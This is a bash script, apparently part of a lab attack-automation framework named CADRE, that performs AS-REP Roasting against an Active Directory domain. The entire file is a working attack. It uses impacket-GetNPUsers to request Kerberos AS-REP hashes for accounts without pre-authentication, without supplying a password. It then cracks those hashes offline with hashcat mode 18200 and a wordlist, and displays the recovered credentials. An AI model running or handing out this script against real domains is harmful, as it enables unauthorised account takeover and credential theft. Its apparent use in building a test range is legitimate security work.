#!/bin/bash
# CADRE — WT#003 AS-REP Roasting
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#003 — AS-REP Roasting"
start_attack "003" "AS-REP Roasting"

require_tool impacket-GetNPUsers
require_tool hashcat
require_env DC02 "DC02"
require_env DOMAIN_CHILD "DOMAIN_CHILD"

step "Step 1: Write target users file"
run_cmd "echo intern_blue > /tmp/asrep_users.txt"

step "Step 2: Request AS-REP hashes for users with DONT_REQ_PREAUTH"
run_cmd "impacket-GetNPUsers \"$DOMAIN_CHILD/\" -dc-ip $DC02 -no-pass -usersfile /tmp/asrep_users.txt -outputfile asrep_hash.txt"

step "Step 3: Verify hash file"
run_cmd "ls -la asrep_hash.txt"

step "Step 4: Crack AS-REP hash with hashcat"
run_cmd "hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt --force"

step "Step 5: Show cracked credentials"
run_cmd "hashcat -m 18200 asrep_hash.txt --show"

result $? "AS-REP Roasting completed"
